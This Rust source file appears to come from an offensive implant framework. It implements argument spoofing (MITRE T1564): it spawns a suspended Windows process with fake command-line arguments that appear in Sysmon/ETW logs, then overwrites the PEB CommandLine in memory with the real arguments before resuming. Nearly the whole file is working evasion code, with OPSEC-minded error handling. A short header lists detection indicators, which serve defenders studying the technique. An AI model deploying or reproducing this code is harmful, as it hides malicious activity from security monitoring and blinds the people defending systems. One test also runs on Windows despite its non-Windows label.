//! Argument Spoofing — T1564
//!
//! Create a process with fake visible arguments (appearing in Sysmon/ETW logs),
//! then overwrite the PEB command line in memory so the process actually runs
//! with different (real) arguments.
//!
//! # Technique
//! 1. `CreateProcessW(executable, fake_args, CREATE_SUSPENDED)` — fake args
//!    appear in process-creation telemetry (Sysmon Event 1, ETW Kernel/Process)
//! 2. `NtQueryInformationProcess(ProcessBasicInformation)` → PEB address
//! 3. `ReadProcessMemory` to walk PEB → `ProcessParameters`
//! 4. Read `RTL_USER_PROCESS_PARAMETERS.CommandLine` (UNICODE_STRING at offset 0x70)
//! 5. `WriteProcessMemory` to overwrite the `CommandLine.Buffer` with real args
//!    (UTF-16LE) and update the `Length` field
//! 6. `ResumeThread` — process executes with real args
//!
//! # Detection Indicators
//! - Memory forensics: `CommandLine` in PEB differs from Sysmon Event 1 args
//! - `NtQueryInformationProcess` on own children shortly after creation
//! - `NtReadVirtualMemory` / `NtWriteVirtualMemory` targeting a freshly created
//!   child process from the same parent
//! - Thread resume after a `ReadProcessMemory`/`WriteProcessMemory` sequence
//!
//! # MITRE ATT&CK
//! T1564 — Hide Artifacts (command-line argument masking via PEB overwrite)

#[cfg(windows)]
use crate::handle::OwnedHandle;
#[cfg(windows)]
use common::KrakenError;

#[cfg(windows)]
use windows_sys::Win32::Foundation::HANDLE;
#[cfg(windows)]
use windows_sys::Win32::System::Diagnostics::Debug::WriteProcessMemory;
#[cfg(windows)]
use windows_sys::Win32::System::Threading::{
    CreateProcessW, ResumeThread, CREATE_SUSPENDED, PROCESS_INFORMATION, STARTUPINFOW,
};
#[cfg(windows)]
use windows_sys::Win32::System::Threading::{
    NtQueryInformationProcess, PROCESSINFOCLASS,
};

// RTL_USER_PROCESS_PARAMETERS offsets (x64)
#[cfg(windows)]
const PEB_PROCESS_PARAMETERS_OFFSET: usize = 0x20; // PEB.ProcessParameters pointer
#[cfg(windows)]
const RTL_COMMAND_LINE_OFFSET: usize = 0x70; // RTL_USER_PROCESS_PARAMETERS.CommandLine

// PROCESS_BASIC_INFORMATION: PebBaseAddress is at offset 8 (after ExitStatus + Reserved)
#[cfg(windows)]
const PBI_PEB_BASE_OFFSET: usize = 8;

/// Create a process with spoofed (visible) arguments, then overwrite the PEB
/// so the process actually executes with `real_args`.
///
/// # Arguments
/// * `executable` — path to the executable (e.g. `"C:\\Windows\\System32\\notepad.exe"`)
/// * `fake_args`  — command line shown in Sysmon/ETW/task-manager logs
/// * `real_args`  — command line the process actually receives at runtime
///
/// # Returns
/// `Ok(pid)` of the newly created process on success.
///
/// # Safety / OPSEC
/// The function resumes the thread only after the PEB overwrite succeeds.
/// If overwrite fails, the suspended process is terminated before returning
/// the error so no dangling suspended processes are left behind.
#[cfg(windows)]
pub fn create_with_spoofed_args(
    executable: &str,
    fake_args: &str,
    real_args: &str,
) -> Result<u32, KrakenError> {
    // -------------------------------------------------------------------------
    // 1. Spawn the process suspended with fake_args visible in logs
    // -------------------------------------------------------------------------
    let mut wide_fake: Vec<u16> = fake_args
        .encode_utf16()
        .chain(std::iter::once(0u16))
        .collect();
    let wide_exe: Vec<u16> = executable
        .encode_utf16()
        .chain(std::iter::once(0u16))
        .collect();

    let mut si: STARTUPINFOW = unsafe { std::mem::zeroed() };
    si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
    let mut pi: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };

    let ok = unsafe {
        CreateProcessW(
            wide_exe.as_ptr(),
            wide_fake.as_mut_ptr(),
            std::ptr::null(),
            std::ptr::null(),
            0,
            CREATE_SUSPENDED,
            std::ptr::null(),
            std::ptr::null(),
            &si,
            &mut pi,
        )
    };
    if ok == 0 {
        return Err(KrakenError::Module(format!(
            "CreateProcessW failed for '{}'",
            executable
        )));
    }

    let proc_handle = pi.hProcess;
    let thread_handle = pi.hThread;
    let pid = pi.dwProcessId;

    // Guard handles — we close them on drop; thread handle is resumed (or not) below.
    let _proc_guard = OwnedHandle::new(proc_handle)
        .ok_or_else(|| KrakenError::Module("invalid process handle".into()))?;
    let _thread_guard = OwnedHandle::new(thread_handle)
        .ok_or_else(|| KrakenError::Module("invalid thread handle".into()))?;

    // Run PEB overwrite; if it fails, terminate the suspended process.
    match overwrite_cmdline_in_peb(proc_handle, real_args) {
        Ok(()) => {}
        Err(e) => {
            // Terminate the zombie process before propagating the error.
            unsafe {
                windows_sys::Win32::System::Threading::TerminateProcess(proc_handle, 1);
            }
            return Err(e);
        }
    }

    // -------------------------------------------------------------------------
    // 6. Resume — process now starts with real_args in its command line
    // -------------------------------------------------------------------------
    let prev_count = unsafe { ResumeThread(thread_handle) };
    if prev_count == u32::MAX {
        return Err(KrakenError::Module("ResumeThread failed".into()));
    }

    tracing::info!(
        pid,
        %fake_args,
        %real_args,
        "process spawned with spoofed command line"
    );

    Ok(pid)
}

/// Perform the PEB CommandLine overwrite for the given process.
#[cfg(windows)]
fn overwrite_cmdline_in_peb(proc_handle: HANDLE, real_args: &str) -> Result<(), KrakenError> {
    use windows_sys::Win32::System::Diagnostics::Debug::ReadProcessMemory;

    // -------------------------------------------------------------------------
    // 2. NtQueryInformationProcess → ProcessBasicInformation → PEB address
    // -------------------------------------------------------------------------
    // PROCESS_BASIC_INFORMATION is 48 bytes (6 × usize on x64)
    let mut pbi = [0u8; 48];
    let mut return_length: u32 = 0;
    let status = unsafe {
        NtQueryInformationProcess(
            proc_handle,
            0, // ProcessBasicInformation
            pbi.as_mut_ptr() as *mut _,
            pbi.len() as u32,
            &mut return_length,
        )
    };
    if status != 0 {
        return Err(KrakenError::Module(format!(
            "NtQueryInformationProcess failed (status 0x{:08X})",
            status
        )));
    }

    // PebBaseAddress is at offset 8 in PROCESS_BASIC_INFORMATION (x64)
    let peb_addr = usize::from_ne_bytes(
        pbi[PBI_PEB_BASE_OFFSET..PBI_PEB_BASE_OFFSET + 8]
            .try_into()
            .map_err(|_| KrakenError::Module("PBI slice conversion failed".into()))?,
    );
    if peb_addr == 0 {
        return Err(KrakenError::Module("PEB address is null".into()));
    }

    // -------------------------------------------------------------------------
    // 3. Read PEB.ProcessParameters pointer (offset 0x20 in PEB on x64)
    // -------------------------------------------------------------------------
    let mut proc_params_ptr = 0usize;
    let mut bytes_read = 0usize;
    let ok = unsafe {
        ReadProcessMemory(
            proc_handle,
            (peb_addr + PEB_PROCESS_PARAMETERS_OFFSET) as *const _,
            &mut proc_params_ptr as *mut usize as *mut _,
            std::mem::size_of::<usize>(),
            &mut bytes_read,
        )
    };
    if ok == 0 || proc_params_ptr == 0 {
        return Err(KrakenError::Module(
            "ReadProcessMemory(PEB.ProcessParameters) failed".into(),
        ));
    }

    // -------------------------------------------------------------------------
    // 4. Read CommandLine UNICODE_STRING at RTL_USER_PROCESS_PARAMETERS+0x70
    //
    //    UNICODE_STRING layout:
    //      +0x00  Length     : u16  (byte count, not including null)
    //      +0x02  MaxLength  : u16
    //      +0x04  (padding)  : u32
    //      +0x08  Buffer     : *u16 (pointer, u64 on x64)
    //
    //    Total: 16 bytes on x64
    // -------------------------------------------------------------------------
    let cmdline_struct_addr = proc_params_ptr + RTL_COMMAND_LINE_OFFSET;
    let mut unicode_str_buf = [0u8; 16];
    let ok = unsafe {
        ReadProcessMemory(
            proc_handle,
            cmdline_struct_addr as *const _,
            unicode_str_buf.as_mut_ptr() as *mut _,
            16,
            &mut bytes_read,
        )
    };
    if ok == 0 {
        return Err(KrakenError::Module(
            "ReadProcessMemory(CommandLine UNICODE_STRING) failed".into(),
        ));
    }

    // Extract the Buffer pointer (bytes 8..16)
    let cmd_buf_ptr = usize::from_ne_bytes(
        unicode_str_buf[8..16]
            .try_into()
            .map_err(|_| KrakenError::Module("CommandLine.Buffer slice conversion failed".into()))?,
    );
    if cmd_buf_ptr == 0 {
        return Err(KrakenError::Module("CommandLine.Buffer is null".into()));
    }

    // -------------------------------------------------------------------------
    // 5. Write real_args (UTF-16LE) into the CommandLine.Buffer
    //    and update the Length field (bytes 0..2 of UNICODE_STRING)
    // -------------------------------------------------------------------------
    let real_wide: Vec<u16> = real_args.encode_utf16().collect();
    let real_byte_len = (real_wide.len() * 2) as u16;

    // Write the UTF-16 payload into the existing buffer
    let mut written = 0usize;
    let ok = unsafe {
        WriteProcessMemory(
            proc_handle,
            cmd_buf_ptr as *mut _,
            real_wide.as_ptr() as *const _,
            real_wide.len() * 2,
            &mut written,
        )
    };
    if ok == 0 {
        return Err(KrakenError::Module(
            "WriteProcessMemory(CommandLine.Buffer) failed".into(),
        ));
    }

    // Update Length (u16 at offset +0 of UNICODE_STRING)
    let mut length_written = 0usize;
    let ok = unsafe {
        WriteProcessMemory(
            proc_handle,
            cmdline_struct_addr as *mut _,
            &real_byte_len as *const u16 as *const _,
            2,
            &mut length_written,
        )
    };
    if ok == 0 {
        return Err(KrakenError::Module(
            "WriteProcessMemory(CommandLine.Length) failed".into(),
        ));
    }

    Ok(())
}

// =============================================================================
// Non-Windows stub
// =============================================================================

#[cfg(not(windows))]
pub fn create_with_spoofed_args(
    _executable: &str,
    _fake_args: &str,
    _real_args: &str,
) -> Result<u32, common::KrakenError> {
    Err(common::KrakenError::Module(
        "Argument spoofing only supported on Windows".into(),
    ))
}

// =============================================================================
// Tests
// =============================================================================

#[cfg(test)]
mod tests {
    use super::*;

    #[cfg(not(windows))]
    #[test]
    fn test_arg_spoof_non_windows() {
        let result = create_with_spoofed_args("notepad.exe", "fake", "real");
        assert!(result.is_err());
        match result {
            Err(common::KrakenError::Module(msg)) => {
                assert!(
                    msg.contains("only supported on Windows"),
                    "unexpected error: {msg}"
                );
            }
            other => panic!("expected Module error, got {:?}", other),
        }
    }

    #[test]
    fn test_arg_spoof_always_errors_on_non_windows() {
        // Validates the platform guard contract regardless of OS.
        let result = create_with_spoofed_args("notepad.exe", "fake_arg", "real_arg");
        assert!(
            result.is_err(),
            "create_with_spoofed_args must fail on non-Windows"
        );
    }
}
